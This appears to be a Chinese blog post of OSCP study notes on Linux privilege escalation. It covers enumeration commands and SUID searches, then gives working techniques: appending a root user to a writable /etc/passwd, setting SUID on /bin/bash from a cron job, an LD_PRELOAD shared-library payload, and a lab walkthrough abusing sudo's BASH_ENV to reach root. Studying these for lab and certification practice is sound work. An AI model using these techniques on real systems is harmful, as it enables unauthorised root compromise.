---
title: Linux Privilege Escalation # 从 Astro 的 title 转换，通常双引号可以省略，除非有特殊字符
date: 2025/04/15 09:00:00 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)，使用您指定的日期格式
# updated: YYYY/MM/DD HH:MM:SS # 可选，如果文章有更新日期，可以添加此字段
description: Linux权限提升 # 从 Astro 的 description 转换
cover: /images/Linux_esc_cover.jpg # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - Linux提权
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - OSCP
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
# password: your_secret_password # 文章加密，根据需要添加
# message: 本文已加密，请输入密码。 # 加密提示信息
# encrypt_abstract: 加密文章摘要。
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---

## 枚举Linux操作系统

### Linux文件系统的权限架构

```bash
┌──(enchanter㉿kali)-[~]
└─$ ls -laih /etc/shadow
4457894 -rw-r----- 1 root shadow 1.9K  3月23日 14:27 /etc/shadow
┌──(enchanter㉿kali)-[~]
└─$ ls -laih /etc/passwd
4457663 -rw-r--r-- 1 root root 4.2K  3月23日 14:27 /etc/passwd
```

在Linux中文件的权限属性通过三个标识符来确认 rwx 读取、写入、执行。

```bash
┌──(enchanter㉿kali)-[~]
└─$ ls -laih fscan
314829 -rwxrwxrwx 1 root root 6.8M 2024年 5月11日 fscan
```

例如这个文件，第一个“-”表示这是一个文件，不是“d”目录。剩下每三位代表一个用户的权限，在这个例子中所有人都对fscan这个文件具有rwx权限。

除了rwx三个权限标识符之外还有另外的两个权限`setuid、setgid`。他们共同用一个`s`标识符来表示。

正常来说我们运行一个可执行文件时候，这个文件就会继承我们执行它的账户的权限。但是当一个文件拥有s标识符时这个文件会以这个文件的拥有者的权限来执行，如果一个文件由root所创建并且拥有s标识符的时候，我们就有机会利用这个文件来提权。

例如我们在拥有一个root用户的定时任务的情况下我们可以向其中添加`chmod +s /bin/bash`来进行提权，待脚本成功执行后我们`/bin/bash -p`添加-p参数表示以能执行的最高权限来执行，从而获得root bash

### 手动枚举

通过查阅passwd文件我们可以知道当前系统都存在哪些用户，进而我们可以逐个到他们的家目录来进行查看（如果有权限的话）

```bash
┌──(enchanter㉿kali)-[~]
└─$ cat /etc/passwd |grep /bin/
root:x:0:0:root:/root:/usr/bin/zsh
sync:x:4:65534:sync:/bin:/bin/sync
mysql:x:100:107:MySQL Server,,,:/nonexistent:/bin/false
cntlm:x:102:65534::/var/run/cntlm:/bin/sh
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
debian-tor:x:107:112::/var/lib/tor:/bin/false
clamav:x:114:118::/var/lib/clamav:/bin/false
arpwatch:x:117:123:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
gpsd:x:127:20:GPSD system user,,,:/run/gpsd:/bin/false
Debian-snmp:x:128:133::/var/lib/snmp:/bin/false
speech-dispatcher:x:130:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
postgres:x:132:137:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
lightdm:x:135:141:Light Display Manager:/var/lib/lightdm:/bin/false
sddm:x:137:143:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
enchanter:x:1000:1000:Enchanter,,,:/home/enchanter:/usr/bin/zsh
Debian-gdm:x:108:113:Gnome Display Manager:/var/lib/gdm3:/bin/false

┌──(enchanter㉿kali)-[~]
└─$ cat /etc/passwd |grep /bin/zsh
root:x:0:0:root:/root:/usr/bin/zsh
enchanter:x:1000:1000:Enchanter,,,:/home/enchanter:/usr/bin/zsh
```

”root:x:0:0:root:/root:/usr/bin/zsh“这其中x表示加密过的密码，但是在现代的系统中密码被隐去存储到shadow文件中。第一个0是UID，针对普通用户Linux从1000开始分配id。第二个0是GID这个代表用户属于什么用户组。紧接着的是这个用户的备注以及家目录和登录后的shell由什么来执行。

#### **机器信息枚举：**

```hostname	```显示或设置系统的主机名。
```uname -a	```显示系统内核信息。
```cat /etc/issue	```显示系统发行版信息。
```cat /etc/os-release	```显示详细的系统发行版信息。
```ps aux	```显示当前系统中所有进程的详细信息。
```ip a	```显示网络接口的详细信息。
```routel	```显示路由表信息。
```ss -anp	```显示套接字信息。
```cat /etc/iptables/rules.v4	```显示IPv4防火墙规则。
```ls -lah /etc/cron*	```查看定时任务表。
```crontab -l```	命令会列出当前用户的定时任务。如果使用 sudo crontab -l，则会显示系统级别的定时任务。
```dpkg -l Debian```系统执行这个命令我们可以看到当前系统都安装了什么应用

#### **关于文件系统的枚举：**

我们使用 ```find/writable -type d 2>/dev/null```来查找我们可写的文件目录
在系统启动时候有时候会由一些磁盘被自动挂载到系统我们使用```cat /etc/fstab```命令来列出在系统**启动**时候会自动挂在的文件系统。
```lsblk```命令来列出现在可用的磁盘

#### **枚举具有s权限的文件：**

`find / -perm -u=s -type f 2>/dev/null`执行这个命令来从根目录查找具有s权限的文件

### 自动枚举

主要由以下几个脚本
LinEUM、LinPeas、unix-privesc-check

## 查找泄露的敏感信息

### 查找用户留下的信息

在Linux系统中应用通常将用户的信息配置文件等内容存储在用户的家目录下eg：.bashrc。在其中就有可能存在明文存储的一些密码。

另外我们还应该注意结合系统的角色，以及先前获取的正在运行的进程等信息，去相关进程的目录下去查找其对应的配置文件其中就不乏由敏感的密码等内容。eg：wp-config.php mysql-connect.ini等文件。 注意关键词config、conf、passwd等。

### 检查服务留下的信息

与Windows系统不同的是，Linux系统支持用户查看高权限进程的信息。我们可以通过`ps -aux`获取到当前正在运行的所有进程的信息，我们可以在其中看到用户启动这一进程时候的命令等信息，其中可能就存在有passwd内容。

利用`tcpdump`命令我们可以抓取正在交互的tcp数据包，其中也有可能存在明文的认证信息，但是这个命令需要使用root权限，所以除非当前用户拥有sudo运行该命令的权限，否则没啥用就是了。

## 不安全的文件权限配置

### 计划任务

当我们发现存在定时任务时候我们就应该想到要去检查一下定时任务执行的文件的权限如何。如果我们拥有对该文件的写权限，我们就能利用它来执行我们想要的命令。

### /etc/passwd可写

我们可以手动添加任意权限的用户

`openssl passwd admin123`来获取加密后的密码，然后`echo  "root1:密码:0:0:root:/root:/bin/bash" >> /etc/passwd `这样就创建了一个名为root1的root用户。

## 不安全的系统组件

### 具有s权限的二进制文件

https://gtfobins.github.io/基本上就靠这个里面的东西来提权了

### sudo -l

通过这个命令列出我们能sudo执行的命令，然后去搜一下这些命令如何生成/bash等shell

#### env_keep

还有另一种利用方式，例如这个靶机

```bash
hish@environment:/tmp$ sudo -l
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

```

可以注意到的是`env_keep+="ENV BASH_ENV"`这个env_keep表示我们在切换用户上下文时候会保留的环境，我们可以重写这个环境来利用
```bash
env_reset 表示重置环境变量，用sudo执行命令时把之前的环境变量清除。

env_keep+=LD_PRELOAD 在保持原有环境变量的同时，增加动态链接器，预加载共享库，有这个选项就可以用来提权。 LD为linker dynamic动态链接器，LD_PRELOAD 是一个用于加载共享库的环境变量，通常在运行程序之前设置，以便在程序启动时预先加载指定的库。

$ vi shell.c	//定义一个共享库 
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    #include <unistd.h>

	//预加载，优先于main函数执行
    void _init() {
            unsetenv("LD_PRELOAD"); //只执行一次即可，所以把预加载环境卸掉
            setgid(0);
            setuid(0);
           	system("/bin/bash");

$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
//-fPIC：生成与位置无关的代码,允许共享库在内存中的任何位置加载和执行。-shared：生成一个共享库而不是可执行文件。-nostartfiles：不使用标准系统启动文件，用于自定义启动代码。

$ sudo LD_PRELOAD=./shell.so find	//利用find的sudo权限执行之前，预加载LD，从而提权。虽然在上述sudo -l的结果中，find本身就可以提权。
```
以上内容是结合了LD预载劫持以及env_keep的联合利用方式。对于env这个靶机而言，我们可以通过下述方法来进行。
```bash
hish@environment:~$ echo 'bash -p' > exp.sh
hish@environment:~$ chmod +x exp.sh 
hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo 
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
root@environment:/home/hish# cat /root/root.txt 
943dd249259dxxxxxxxxxxxx
root@environment:/home/hish# 

```


### 内核漏洞

`uname -a`命令得出的系统信息，我们可以上网搜一下有没有内核提权漏洞，这些漏洞基本上就是一些老一点的系统才存在。`searchsploit`命令也能搜索。

一般是.c文件的利用方式，我们尽量在目标系统上面进行编译，否则容易出现错误导致系统崩溃等。


## 总结
感觉有点熟悉的一节，看的异常的快，可能是因为我之前打靶机的时候都能遇到过了。
感觉这个地方写的比我好多了，所以贴出来吧

::github{repo="Ignitetechnologies/Linux-Privilege-Escalation"}

::github{repo="frizb/Linux-Privilege-Escalation"}
